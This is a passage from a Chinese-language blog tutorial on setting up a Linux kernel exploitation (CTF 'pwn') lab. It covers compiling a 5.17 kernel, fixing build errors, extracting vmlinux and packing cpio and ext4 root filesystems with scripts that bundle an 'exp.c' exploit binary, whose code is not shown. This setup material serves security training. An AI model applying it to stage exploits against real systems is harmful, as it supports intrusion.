1</span><br><span class="line">update-alternatives: using /usr/bin/gcc-13 to provide /usr/bin/gcc (gcc) <span class="keyword">in</span> manual mode</span><br><span class="line">$ gcc --version</span><br><span class="line">gcc (Ubuntu 13.2.0-23ubuntu4) 13.2.0</span><br><span class="line">Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>从<a class="link"   target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载与题目所给内核版本相同的内核源码。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.17.tar.gz</span><br><span class="line">tar -zxvf linux-5.17.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>在编译前先安装相关的依赖：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install libncurses5-dev libncursesw5-dev -y</span><br><span class="line"><span class="built_in">sudo</span> apt install flex -y</span><br><span class="line"><span class="built_in">sudo</span> apt install bison -y</span><br><span class="line"><span class="built_in">sudo</span> apt install libelf-dev -y </span><br><span class="line"><span class="built_in">sudo</span> apt install libssl-dev -y </span><br><span class="line"><span class="built_in">sudo</span> apt install dwarves -y </span><br><span class="line"><span class="built_in">sudo</span> apt install zstd -y </span><br></pre></td></tr></table></figure></div>

<p>在内核源码的根目录运行如下命令配置内核：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>

<p>保证勾选如下配置（默认都是勾选了的）：</p>
<ul>
<li>Kernel hacking —&gt; Kernel debugging</li>
<li>Kernel hacking —&gt; Compile-time checks and compiler options —&gt; Compile the kernel with debug info</li>
<li>Kernel hacking —&gt; Generic Kernel Debugging Instruments –&gt; KGDB: kernel debugger</li>
<li>kernel hacking —&gt; Compile the kernel with frame pointers</li>
</ul>
<p>一般来说不需要有什么改动，直接保存退出即可。此时会在源码根目录生成一个 <code>.config</code> 配置文件。这个配置文件在编译的时候会被翻译成 <code>include\generated\autoconf.h</code> 中的宏定义，供内核镜像和内核模块编译的时候使用。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>如果题目提供了配置文件，最好和自己生成的配置文件比较一下，看一下出题人修改了内核的那些配置，因为有时候出题人为了达成特定的利用条件会开启或关闭一些内核的保护选项。我们要做的就是把这些选项修改得和出题人提供的配置文件相同。</p>

    </div>
  </div>

<p>之后运行如下命令编译内核。其中 <code>bzImage</code> 编译选项可以避免一些不必要的内核模块编译，节省时间。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>

<p>最终会生成如下文件：</p>
<ul>
<li>在 <code>arch/x86/boot/</code> 目录下生成 <code>bzImage</code>。</li>
<li>在源码根目录生成 <code>vmlinux</code>（有时候虽然会编译报错退出，但可能只是生成 <code>bzImage</code> 那一步出错了，而 <code>vmlinux</code> 已经生成了）。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <ul>
<li><p><strong>缺少证书文件</strong></p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-certs.pem&#x27;, needed by &#x27;certs/x509_certificate_list&#x27;.  Stop.</span><br><span class="line">make: *** [Makefile:1868: certs] Error 2</span><br></pre></td></tr></table></figure></div>

<p>  需要将 <code>CONFIG_SYSTEM_TRUSTED_KEYS</code> 和 <code>CONFIG_SYSTEM_REVOCATION_KEYS</code> 中的内容置空。</p>
<blockquote>
<p><code>CONFIG_SYSTEM_TRUSTED_KEYS</code> 和 <code>CONFIG_SYSTEM_REVOCATION_KEYS</code> 是 Linux 内核配置选项，主要用于与内核的公钥和证书管理相关。它们控制的是内核如何验证签名的模块以及其他敏感操作的公钥和证书。</p>
</blockquote>
  <div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- ./.config.bak	2024-12-06 16:41:46.982198997 +0800</span></span><br><span class="line"><span class="comment">+++ ./.config	2024-12-06 16:42:19.650711503 +0800</span></span><br><span class="line"><span class="meta">@@ -10821,14 +10821,14 @@</span></span><br><span class="line"> CONFIG_MODULE_SIG_KEY_TYPE_RSA=y</span><br><span class="line"> # CONFIG_MODULE_SIG_KEY_TYPE_ECDSA is not set</span><br><span class="line"> CONFIG_SYSTEM_TRUSTED_KEYRING=y</span><br><span class="line"><span class="deletion">-CONFIG_SYSTEM_TRUSTED_KEYS=&quot;debian/canonical-certs.pem&quot;</span></span><br><span class="line"><span class="addition">+CONFIG_SYSTEM_TRUSTED_KEYS=&quot;&quot;</span></span><br><span class="line"> CONFIG_SYSTEM_EXTRA_CERTIFICATE=y</span><br><span class="line"> CONFIG_SYSTEM_EXTRA_CERTIFICATE_SIZE=4096</span><br><span class="line"> CONFIG_SECONDARY_TRUSTED_KEYRING=y</span><br><span class="line"> CONFIG_SYSTEM_BLACKLIST_KEYRING=y</span><br><span class="line"> CONFIG_SYSTEM_BLACKLIST_HASH_LIST=&quot;&quot;</span><br><span class="line"> CONFIG_SYSTEM_REVOCATION_LIST=y</span><br><span class="line"><span class="deletion">-CONFIG_SYSTEM_REVOCATION_KEYS=&quot;debian/canonical-revoked-certs.pem&quot;</span></span><br><span class="line"><span class="addition">+CONFIG_SYSTEM_REVOCATION_KEYS=&quot;&quot;</span></span><br><span class="line"> # end of Certificates for signature checking</span><br><span class="line"></span><br><span class="line"> CONFIG_BINARY_PRINTF=y</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>BTF 加载失败</strong> </p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAILED: load BTF from vmlinux: Invalid argument</span><br></pre></td></tr></table></figure></div>
<p>  这是在生成内核时加载 <strong>BTF（BPF Type Format）</strong> 数据时出现的错误。需要将 <code>CONFIG_DEBUG_INFO_BTF</code> 和 <code>CONFIG_DEBUG_INFO_BTF_MODULES</code> 设置为 <code>n</code> 来禁用 BTF 相关的配置项。</p>
<blockquote>
<p>BTF 是 Linux 内核中用于 BPF 程序和调试的类型信息格式。此错误通常表示在构建过程中，内核映像 <code>vmlinux</code> 的 BTF 数据无法正确加载或生成，可能与内核配置或工具链版本不兼容有关。</p>
</blockquote>
  <div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -11025,9 +11025,9 @@</span></span><br><span class="line"> # CONFIG_DEBUG_INFO_SPLIT is not set</span><br><span class="line"> CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y</span><br><span class="line"> # CONFIG_DEBUG_INFO_DWARF4 is not set</span><br><span class="line"><span class="deletion">-CONFIG_DEBUG_INFO_BTF=y</span></span><br><span class="line"><span class="addition">+# CONFIG_DEBUG_INFO_DWARF5 is not set</span></span><br><span class="line"><span class="addition">+# CONFIG_DEBUG_INFO_BTF is not set</span></span><br><span class="line"> CONFIG_PAHOLE_HAS_SPLIT_BTF=y</span><br><span class="line"><span class="deletion">-CONFIG_DEBUG_INFO_BTF_MODULES=y</span></span><br><span class="line"> CONFIG_GDB_SCRIPTS=y</span><br><span class="line"> CONFIG_FRAME_WARN=1024</span><br><span class="line"> # CONFIG_STRIP_ASM_SYMS is not set</span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<h4 id="vmlinux-to-elf"><a href="#vmlinux-to-elf" class="headerlink" title="vmlinux-to-elf"></a>vmlinux-to-elf</h4><p><code>vmlinux-to-elf</code> 是一个用于将 Linux 内核映像 <code>vmlinux</code> 转换为 ELF 格式的工具。</p>
<p>安装：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line">sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>

<p>使用方法：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>

<p>这个方法获取的 vmlinux 带调试符号，不过结构体相关的调试符号只有编译内核可以获得。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a4a9e1beefc8b080d8988819ab67e61a.png"
                     
                ></p>
<h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><p>对于实际的 linux 系统，我们可以通过其内置的包管理工具在其仓库中搜索与内核镜像相关的包。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ apt search linux-image-</span><br><span class="line">...</span><br><span class="line">linux-image-6.8.0-49-generic/noble-updates,noble-security,now 6.8.0-49.49 amd64 [installed,automatic]</span><br><span class="line">  Signed kernel image generic</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>如果我们找到对应版本的<strong>内核镜像</strong>以及<strong>内核头文件</strong>和<strong>内核模块</strong>可以将其下载下来。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt download linux-image-6.8.0-49-generic <span class="comment"># 内核镜像</span></span><br><span class="line">apt download linux-headers-6.8.0-49-generic <span class="comment"># 内核头文件</span></span><br><span class="line">apt download linux-modules-6.8.0-49-generic <span class="comment"># 内核模块</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>linux-image</code>：包含了整个内核的可执行镜像。</li>
<li><code>linux-headers</code>：包含内核的头文件，头文件定义了内核中使用的各种数据结构、函数声明、宏等，供用户空间程序或内核模块编译时使用。</li>
<li><code>linux-modules</code>：包含内核模块。</li>
</ul>
<p>下载下来的安装包可以安装在本地的操作系统上，这样本地的操作系统就和远程环境拥有完全一致的内核镜像以及内核模块。另外我们还可以通过内核头文件进行内核模块的开发。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg -i ./llinux-image-6.8.0-49-generic_6.8.0-49.49_amd64.deb</span><br><span class="line"><span class="built_in">sudo</span> dpkg -i ./linux-headers-6.8.0-49-generic_6.8.0-49.49_amd64.deb</span><br><span class="line"><span class="built_in">sudo</span> dpkg -i ./linux-modules-6.8.0-49-generic_6.8.0-49.49_amd64.deb</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></div>

<p>我们可以通过 <code>dpkg -x</code> 命令解压安装包。这样就可以获取到内核模块和 vmlinuz（bzImage 格式）内核镜像。通过 <code>vmlinux-to-elf</code> 即可提取出 vmlinux 镜像。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X ./llinux-image-6.8.0-49-generic_6.8.0-49.49_amd64.deb image</span><br><span class="line">dpkg -x ./linux-modules-6.8.0-49-generic_6.8.0-49.49_amd64.deb modules</span><br></pre></td></tr></table></figure></div>

<h4 id="bzImage-解压（不推荐）"><a href="#bzImage-解压（不推荐）" class="headerlink" title="bzImage 解压（不推荐）"></a>bzImage 解压（不推荐）</h4><p>使用 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" >extract-vmlinux<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  脚本从 bzImage 解压出 vmlinux 。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Use readelf to check <span class="keyword">if</span> it<span class="string">&#x27;s a valid ELF</span></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">TODO: find a better to way to check that it&#x27;</span>s really vmlinux</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">      and not just an elf</span></span><br><span class="line">	readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">	cat $1</span><br><span class="line">	exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">The obscure use of the <span class="string">&quot;tr&quot;</span> filter is to work around older versions of</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">&quot;grep&quot;</span> that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Try to find the header (<span class="variable">$1</span>) and decompress from here</span></span><br><span class="line">	for	pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">	do</span><br><span class="line">		pos=$&#123;pos%%:*&#125;</span><br><span class="line">		tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">		check_vmlinux $tmp</span><br><span class="line">	done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if	[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">	exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure></div>

<p>运行如下命令就可以解压出 vmlinux 了。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>

<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统是存储数据的一种方法，它定义了如何在存储设备（如硬盘、SSD、U盘）上存储、组织和检索文件。它包括以下内容：</p>
<ul>
<li><strong>数据存储结构</strong>：管理文件存储的方式，如块、扇区。</li>
<li><strong>文件元数据</strong>：描述文件的信息，如名称、大小、权限、时间戳。</li>
<li><strong>目录结构</strong>：支持文件的层次化组织。</li>
<li><strong>访问接口</strong>：提供文件的读取、写入和删除操作。</li>
</ul>
<h3 id="文件系统类别"><a href="#文件系统类别" class="headerlink" title="文件系统类别"></a>文件系统类别</h3><p>文件系统类别可以根据文件系统镜像的格式和用途进行分类。常见的文件系统镜像格式包括 <code>cpio</code>、<code>img</code>、<code>qcow2</code>（ QEMU 的虚拟磁盘镜像格式）和 <code>vmdk</code>（VMware 虚拟机使用的磁盘映像格式）等。其中 ctf 中最常见的是 <code>cpio</code> 和 <code>img</code> 这两种格式。</p>
<h4 id="cpio"><a href="#cpio" class="headerlink" title="cpio"></a>cpio</h4><p>cpio 是一种归档工具与归档格式，用于将一组文件和目录打包成一个归档文件。与 tar 类似，它不带文件系统元数据的复杂结构，只是将文件挨个打包，从而形成一个线性的存档文件。</p>
<p>在 Linux 系统启动流程中，initramfs 常常使用 cpio 格式来打包初始根文件系统（内核早期启动所需的基础文件和脚本），内核可以直接解压 cpio 格式的 initramfs。</p>
<h5 id="文件系统制作"><a href="#文件系统制作" class="headerlink" title="文件系统制作"></a>文件系统制作</h5><ol>
<li><p>准备一个目录树，其中包含要打包的文件和目录结构。例如，创建 <code>rootfs/</code> 目录，里面有 <code>bin/</code>, <code>etc/</code>, <code>lib/</code>, <code>sbin/</code> 等文件和目录，并且将 busybox 中的各种工具拷贝到 <code>rootfs</code> 中。</p>
</li>
<li><p>使用下面的命令将该目录打包成 cpio 格式，其中 <code>-H=newc</code>（<code>--format=newc</code>）是 initramfs 常用格式选项。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line">find . | cpio -o -H newc &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h5 id="文件系统解压"><a href="#文件系统解压" class="headerlink" title="文件系统解压"></a>文件系统解压</h5><p>我可以通过下面这条命令将 cpio 格式的文件解压成文件目录。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio -D rootfs</span><br></pre></td></tr></table></figure></div>

<h5 id="文件系统打包"><a href="#文件系统打包" class="headerlink" title="文件系统打包"></a>文件系统打包</h5><p>cpio 类型文件系统的打包脚本如下，注意这里的 <code>rootfs</code> 是事先从 <code>rootfs.cpio</code> 中解压出来的。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 rootfs 内容到临时目录</span></span><br><span class="line"><span class="built_in">cp</span> -r rootfs rootfs_tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 exp 程序，生成静态链接的可执行文件</span></span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line"><span class="comment"># upx --best --lzma exp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 exp 复制到临时文件系统</span></span><br><span class="line"><span class="built_in">cp</span> exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入临时文件系统目录</span></span><br><span class="line"><span class="built_in">cd</span> rootfs_tmp || <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 cpio 工具打包文件系统成 rootfs.cpio</span></span><br><span class="line">find . | cpio -o -H newc &gt; ../rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回上一层目录并删除临时目录</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -rf rootfs_tmp</span><br></pre></td></tr></table></figure></div>

<h4 id="img-Raw-Image"><a href="#img-Raw-Image" class="headerlink" title="img (Raw Image)"></a>img (Raw Image)</h4><p><code>.img</code> 文件常指原始磁盘镜像文件，它是一个逐字节的磁盘副本。里面可能有分区表、引导记录（MBR、GPT）以及每个分区上具体文件系统的数据（如 ext4、FAT32、NTFS 等）。</p>
<h5 id="文件系统制作-1"><a href="#文件系统制作-1" class="headerlink" title="文件系统制作"></a>文件系统制作</h5><ol>
<li><p>创建一个空白的磁盘镜像文件。下面这条命令为生成一个大小为 32M 的文件，内容填充为 0。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=rootfs.img bs=1M count=32</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>dd</code> 一个用于复制和转换文件的工具。</li>
<li><code>if=/dev/zero</code> 表示输入文件是 <code>/dev/zero</code>，这是一个特殊设备文件，它会不断地提供零字节。</li>
<li><code>of=rootfs.img</code> 指定输出文件是 <code>rootfs.img</code>，也就是最终生成的磁盘镜像文件名。</li>
<li><code>bs=1M</code> 设置块大小为 1MB。这意味着 <code>dd</code> 会以 1MB 为单位读取和写入数据。</li>
<li><code>count=32</code> 指定了要写入 32 个块，即总共 32MB 的数据。</li>
</ul>
</li>
<li><p>将空白镜像文件格式化为 <code>ext4</code> 文件系统。这里 <code>mkfs.ext4</code> 是用来创建 <code>ext4</code> 文件系统的命令。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 rootfs.img</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>将事先准备好的 linux 文件系统目录 <code>rootfs</code> 中的内容拷贝到 <code>rootfs.img</code> 中，这里需要将 <code>rootfs.img</code> 挂载出来才能往里面添加文件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ./rootfs_tmp</span><br><span class="line">mount ./rootfs.img ./rootfs_tmp</span><br><span class="line"><span class="built_in">cp</span> -rf ./rootfs ./rootfs_tmp</span><br><span class="line">umount ./rootfs_tmp</span><br><span class="line"><span class="built_in">rm</span> -r ./rootfs_tmp</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h5 id="文件系统打包-1"><a href="#文件系统打包-1" class="headerlink" title="文件系统打包"></a>文件系统打包</h5><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建临时目录目录 rootfs_tmp</span></span><br><span class="line"><span class="built_in">mkdir</span> rootfs_tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载 rootfs.img 文件为 rootfs_tmp</span></span><br><span class="line"><span class="built_in">sudo</span> mount rootfs.img rootfs_tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 exp 程序，生成静态链接的可执行文件</span></span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line"><span class="comment"># upx --best --lzma exp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将编译好的 exp 文件复制到 rootfs_tmp 目录</span></span><br><span class="line"><span class="built_in">cp</span> exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 rootfs.img 